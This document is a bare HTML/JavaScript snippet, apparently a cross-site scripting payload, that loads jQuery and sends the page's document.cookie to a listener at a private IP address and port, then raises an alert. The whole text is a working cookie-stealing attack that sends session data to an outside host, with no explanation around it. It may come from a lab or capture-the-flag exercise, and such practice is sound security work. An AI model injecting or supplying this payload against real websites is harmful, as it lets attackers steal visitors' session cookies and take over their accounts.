<script src="https://code.jquery.com/jquery-3.4.1.min.js"> </script>
<script>
$.get(
    "http://10.24.105.232:4020",
    {cookie : document.cookie},
    function(data) {
        alert("I");
    }
);
</script>
